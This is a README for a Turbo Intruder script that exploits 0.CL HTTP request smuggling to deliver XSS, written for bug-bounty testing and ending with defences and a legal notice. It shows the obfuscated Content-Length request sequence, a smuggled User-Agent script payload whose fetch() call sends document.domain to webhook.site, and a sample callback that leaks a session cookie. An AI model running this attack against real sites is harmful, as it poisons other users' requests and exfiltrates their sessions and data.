# 0.CL Request Smuggling Tool

A Turbo Intruder script for detecting and exploiting 0.CL (zero Content-Length) HTTP request smuggling vulnerabilities with XSS payload and webhook callbacks.

## What is 0.CL Request Smuggling?

0.CL (zero Content-Length) request smuggling is an advanced HTTP desynchronization attack discovered by James Kettle. It exploits discrepancies in how servers parse Content-Length headers by using obfuscation techniques (spaces, tabs, duplicate headers) to cause frontend and backend servers to disagree about request boundaries.

This script implements a **double desync** attack that allows you to poison victim requests with XSS payloads that execute in their browsers and callback to your webhook server.

## 📚 Research Credit

Based on research by **James Kettle** (PortSwigger):
- [HTTP/1.1 Must Die](https://portswigger.net/research/http1-must-die)
- [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)

## ✨ Features

- 🎪 **Automated double desync attack** with configurable timing
- 🪝 **Webhook callbacks** for out-of-band XSS confirmation
- 🔧 **Multiple Content-Length obfuscation** techniques
- 🎯 **Configurable payloads and detection** methods
- 📊 **Real-time progress tracking** and success indicators
- 🛡️ **Rate limiting protection** with automatic delays
- 🐛 **Bug bounty ready** with comprehensive PoC generation

## 🚀 Quick Start

### Prerequisites

- Burp Suite Professional (for Turbo Intruder)
- Python environment (bundled with Burp)
- A webhook service (Burp Collaborator, webhook.site, interact.sh)

### Installation

1. Download the `0cl_smuggling.py` script
2. Open Burp Suite
3. Send any request to Turbo Intruder (Right-click → Extensions → Turbo Intruder)
4. Paste the script into the editor

### Configuration

Edit the `CONFIG` dictionary at the top of the script:

```python
CONFIG = {
    # Your target
    'target_host': 'vulnerable-website.com',
    
    # Your webhook (GET THIS FIRST!)
    'webhook_url': 'https://YOUR-ID.oastify.com',
    
    # Path that triggers early response (try /static/*, /css/*, /resources/*)
    'gadget_path': '/resources/css/anything',
    
    # Target path for smuggled request
    'smuggled_path': '/admin',
    
    # Number of attack attempts
    'attack_iterations': 50,
}
```

### Getting a Webhook

Choose one of these options:

**Option 1: Burp Collaborator (Recommended)**
```
1. In Burp Suite, go to: Burp menu → Burp Collaborator client
2. Click "Copy to clipboard"
3. Paste into 'webhook_url' in CONFIG
```

**Option 2: Webhook.site (Free)**
```
1. Visit https://webhook.site
2. Copy your unique URL
3. Paste into 'webhook_url' in CONFIG
```

**Option 3: Interact.sh (Free)**
```bash
curl -X POST https://interact.sh/register
# Use the returned URL in 'webhook_url'
```

### Running the Attack

1. Configure your target and webhook
2. Click "Attack" in Turbo Intruder
3. Watch the console output for success indicators
4. **Monitor your webhook for callbacks!**

## 🎯 How It Works

```
[Stage 1: Early Response Gadget]
POST /resources/css/anything HTTP/1.1
Content-Length : %s    ← Obfuscated header (space after colon)
[no body]

[Stage 2: Split Request]
OPTIONS / HTTP/1.1     ← Gets chopped
Content-Length: 123
X: YGET /404 HTTP/1.1  ← Completes after smuggle

[Smuggled Request]
GET /admin HTTP/1.1
User-Agent: "/><script>fetch('https://webhook.site/?xss='+document.domain)</script>

[Victim Request]
GET / HTTP/1.1         ← Gets poisoned with smuggled request
```

### Attack Flow

1. **Stage 1** sends a request with obfuscated Content-Length that causes an early response
2. **Stage 2** sends a "chopped" request that gets split across the desync boundary
3. **Smuggled request** contains the XSS payload and gets prefixed to the victim's request
4. **Victim request** executes the XSS payload when rendered
5. **Webhook receives callback** proving successful exploitation

## 🔍 Finding Early Response Gadgets

An "early response gadget" is a path that returns a response before reading the full request body. Common candidates:

```
/static/*
/resources/*
/css/*
/js/*
/images/*
/assets/*
/media/*
/public/*
/cdn/*
/content/*
```

### Testing for Gadgets

Send a POST request with a large Content-Length but no body:

```http
POST /static/test.css HTTP/1.1
Host: target.com
Content-Length: 100

```

If you get a response immediately (200, 404, 403) → **Potential gadget!**

## 🎪 Success Indicators

### Console Output
```
[+] POTENTIAL XSS! Indicator "<script>" found in victim response
[+] Status: 200
[+] Length: 5832
[!] CHECK YOUR WEBHOOK FOR CALLBACK!
```

### Webhook Callback
```
GET /?xss=vulnerable-website.com
GET /?cookie=sessionid=abc123...
```

### Response Reflection
- Your webhook URL appears in victim response
- XSS payload reflected in HTML/headers
- Unusual status codes (403, 401, 500)

## ⚙️ Advanced Configuration

### Content-Length Obfuscation Techniques

```python
'content_length_obfuscation': 'space',   # Content-Length : %s
'content_length_obfuscation': 'tab',     # Content-Length\t: %s
'content_length_obfuscation': 'newline', # Content-Length\r\n : %s
'content_length_obfuscation': 'multiple', # Two CL headers
```

### Stage 2 Method Variations

```python
'stage2_method': 'OPTIONS',  # Default (least suspicious)
'stage2_method': 'GET',      # Try if OPTIONS fails
'stage2_method': 'POST',     # Last resort
```

### Attack Timing

```python
'concurrent_connections': 10,  # Parallel connections (reduce if rate limited)
'timeout': 15,                 # Request timeout in seconds
'attack_iterations': 50,       # Total attempts (use -1 for infinite)
```

## 🐛 Troubleshooting

### No Callbacks Received

1. **Check webhook URL** - Make sure it's accessible and correct
2. **Try different gadget paths** - Test multiple static resource paths
3. **Adjust obfuscation** - Try different Content-Length techniques
4. **Reduce concurrency** - Lower `concurrent_connections` to 5
5. **Check CSP** - Content Security Policy might block callbacks

### Getting Rate Limited

```python
'concurrent_connections': 5,   # Reduce parallel connections
'attack_iterations': 20,       # Fewer attempts
```

### Timeouts

```python
'timeout': 30,                 # Increase timeout
'concurrent_connections': 5,   # Reduce load
```

### Gadget Not Working

- Try different paths (see "Finding Early Response Gadgets")
- Use Burp Repeater to manually test paths
- Look for paths that return quickly even with high Content-Length
- Check server behavior with different HTTP methods

## 📊 Interpreting Results

### Positive Indicators

✅ Webhook receives callback with domain/cookie  
✅ Console shows "POTENTIAL XSS!" or "SUCCESS!"  
✅ Webhook URL reflected in victim response  
✅ Response length changes significantly  
✅ Unusual status codes (403 on public page)  

### False Positives

⚠️ Static reflection of User-Agent without execution  
⚠️ WAF/IDS blocking attempts  
⚠️ Normal 404 responses  

## 🎓 Bug Bounty Tips

### Responsible Disclosure

1. **Use harmless payloads** - Stick to `document.domain` callbacks
2. **Target your own sessions** - Don't poison production users
3. **Test during off-hours** - Minimize impact on real users
4. **Clean up** - Clear any poisoned cache entries

### Writing the Report

Include:

- **Title**: "HTTP Request Smuggling via 0.CL Desync leading to XSS"
- **Severity**: High/Critical (can lead to account takeover)
- **Steps to Reproduce**: Full Turbo Intruder setup
- **Proof of Concept**: Webhook callback screenshot
- **Impact**: Session hijacking, account takeover, data theft
- **Affected Endpoints**: List all vulnerable paths

### Sample Report Template

```markdown
## Summary
HTTP Request Smuggling vulnerability via 0.CL Content-Length desync 
leading to stored XSS affecting all users.

## Vulnerability Details
The application is vulnerable to HTTP Request Smuggling due to 
Content-Length header parsing discrepancies between frontend and 
backend servers. This allows attackers to poison victim requests 
with malicious payloads.

## Proof of Concept
[Webhook callback screenshot]
[Turbo Intruder configuration]

## Steps to Reproduce
1. Configure Turbo Intruder with provided script
2. Set target_host to [domain]
3. Set webhook_url to [your webhook]
4. Run attack for 50 iterations
5. Observe callback to webhook with victim data

## Impact
- Account takeover via session hijacking
- Credential theft
- Malicious actions on behalf of users
- Data exfiltration

## Affected URLs
- https://target.com/ (victim endpoint)
- https://target.com/resources/* (gadget)

## Remediation
1. Normalize Content-Length headers
2. Reject requests with duplicate/obfuscated headers
3. Use HTTP/2 to eliminate request smuggling
4. Implement strict request parsing
```

## 🛡️ Defense

If you're a developer protecting against this:

1. **Normalize headers** - Strip whitespace from header names/values
2. **Reject ambiguous requests** - Deny duplicate or malformed headers
3. **Use HTTP/2** - Eliminates CL-based smuggling vectors
4. **Synchronize parsing** - Ensure frontend/backend agreement
5. **Timeout early responses** - Don't send responses before reading full body

## ⚖️ Legal Notice

This tool is for **authorized security testing only**. Only use against:

- Your own systems
- Systems you have explicit written permission to test
- Bug bounty programs that permit this testing method

Unauthorized access to computer systems is illegal. Always follow:
- Bug bounty program rules
- Responsible disclosure guidelines
- Local computer crime laws

## 📖 Additional Resources

- [James Kettle's HTTP Desync Research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/request-smuggling)
- [Turbo Intruder Documentation](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988)
- [HTTP Request Smuggling Tutorial](https://portswigger.net/web-security/request-smuggling/finding)

## 🤝 Contributing

Found a bug or have improvements? Contributions welcome!

1. Fork the repository
2. Create a feature branch
3. Test thoroughly
4. Submit a pull request

## 📄 License

MIT License - See LICENSE file for details

## 🙏 Acknowledgments

- **James Kettle** - Original research and discovery
- **PortSwigger** - Turbo Intruder tool and research platform
- Security community for continued research and improvements

---

**⚠️ Remember**: Always test ethically, get permission, and disclose responsibly!
